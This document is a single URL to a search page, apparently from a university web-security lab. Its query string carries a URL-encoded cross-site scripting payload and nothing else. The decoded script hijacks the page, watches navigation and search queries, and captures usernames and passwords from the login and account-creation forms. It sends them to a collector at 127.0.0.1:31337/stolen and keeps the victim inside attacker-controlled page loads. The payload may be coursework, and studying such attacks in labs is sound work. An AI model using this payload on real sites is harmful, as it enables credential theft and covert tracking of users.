http://trurl.cs.illinois.edu/search?xssdefense=4&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20function%20log(data)%20%7B%0A%20%20%20%20console.log(%24.param(data))%3B%0A%20%20%20%20%24.get(attacker%2C%20data)%3B%0A%20%20%7D%0A%20%20function%20logLocation(loc)%20%7B%0A%20%20%20%20if%20(%24(%60%23logged-in-user%60).length)%20%7B%0A%20%20%20%20%20%20var%20username%20%3D%20%24(%60%23logged-in-user%60).text()%3B%0A%20%20%20%20%20%20log(%7Bevent%3A%20%60nav%60%2C%20user%3A%20username%2C%20url%3A%20loc%7D)%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20log(%7Bevent%3A%20%60nav%60%2C%20url%3A%20loc%7D)%3B%0A%20%20%20%20%7D%0A%20%20%7D%0A%20%20function%20logUserAndExecute(action)%20%7B%0A%20%20%20%20var%20username%20%3D%20%24(%60%23username%60).val()%3B%0A%20%20%20%20var%20userpass%20%3D%20%24(%60%23userpass%60).val()%3B%0A%20%20%20%20if%20(username%20%26%26%20userpass)%20%7B%0A%20%20%20%20%20%20%20%20log(%7Bevent%3A%20action.replace(%60.%2F%60%2C%20%60%60)%2C%20user%3A%20username%2C%20password%3A%20userpass%7D)%3B%0A%20%20%20%20%20%20%24.ajax(%7B%0A%20%20%20%20%20%20%20%20type%3A%20%60POST%60%2C%0A%20%20%20%20%20%20%20%20url%3A%20action%2C%0A%20%20%20%20%20%20%20%20data%3A%20%60username%3D%60%2Busername%20%2B%20%60%26password%3D%60%2Buserpass%2C%0A%20%20%20%20%20%20%20%20success%3A%20function(response)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%24(%60html%60).hide()%3B%0A%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60%2C%20false)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D%20else%20if%20(!username)%20%7B%0A%20%20%20%20%20%20username%20%3D%20%24(%60%23logged-in-user%60).text()%3B%0A%20%20%20%20%20%20log(%7Bevent%3A%20action.replace(%60.%2F%60%2C%20%60%60)%2C%20user%3A%20username%7D)%3B%0A%20%20%20%20%20%20%24.ajax(%7B%0A%20%20%20%20%20%20%20%20type%3A%20%60POST%60%2C%0A%20%20%20%20%20%20%20%20url%3A%20action%2C%0A%20%20%20%20%20%20%20%20success%3A%20function()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%24(%60html%60).hide()%3B%0A%20%20%20%20%20%20%20%20%20%20proxy(%60.%2F%60%2C%20false)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D%0A%20%20%7D%0A%0A%20%20function%20proxy(href%2C%20hasPrevPage)%20%7B%0A%20%20%20%20%24(%60html%60).load(href%2C%20function()%7B%0A%20%20%20%20%20%20%24(%60html%60).show()%3B%0A%20%20%20%20%20%20logLocation(href)%3B%0A%20%20%20%20%20%20if%20(!hasPrevPage)%20%7B%0A%20%20%20%20%20%20%20%20history.pushState(null%2C%20null%2C%20href)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%24(%60%23new-account-btn%60).click(function(event)%20%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20logUserAndExecute(%60.%2Fcreate%60)%3B%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%24(%60%23log-in-btn%60).click(function(event)%20%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20logUserAndExecute(%60.%2Flogin%60)%3B%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%24(%60%23log-out-btn%60).click(function(event)%20%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20logUserAndExecute(%60.%2Flogout%60)%3B%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%24(%60%23search-btn%60).click(function(event)%20%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20var%20query%20%3D%20encodeURIComponent(%24(%60%23query%60).val())%3B%0A%20%20%20%20%20%20%20%20if%20(%24(%60%23logged-in-user%60).length)%20%7B%0A%20%20%20%20%20%20%20%20%20%20var%20username%20%3D%20%24(%60%23logged-in-user%60).text()%3B%0A%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%60query%60%2C%20user%3A%20username%2C%20query%3A%20query%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20log(%7Bevent%3A%20%60query%60%2C%20query%3A%20query%7D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%24(%60html%60).hide()%3B%0A%20%20%20%20%20%20%20%20var%20searchurl%20%3D%20%60.%2Fsearch%3F%60%20%2B%20%60q%3D%60%20%2B%20query%3B%0A%20%20%20%20%20%20%20%20proxy(searchurl%2C%20false)%3B%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%20%20%24(%60%23search-again-btn%2C%20%23bungle-lnk%60).click(function(event)%20%7B%0A%20%20%20%20%20%20%20%20event.preventDefault()%3B%0A%20%20%20%20%20%20%20%20%24(%60html%60).hide()%3B%0A%20%20%20%20%20%20%20%20proxy(%60.%2F%60%2C%20false)%3B%0A%20%20%20%20%20%20%7D)%3B%0A%20%20%20%20%7D)%3B%0A%20%20%7D%0A%20%20%24(%60html%60).hide()%3B%0A%20%20history.replaceState(null%2C%20null%2C%20%60.%2F%60)%3B%0A%20%20proxy(%60.%2F%60%2C%20false)%3B%0A%7Dpayload(%60http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%60)%3C%2Fscript%3E
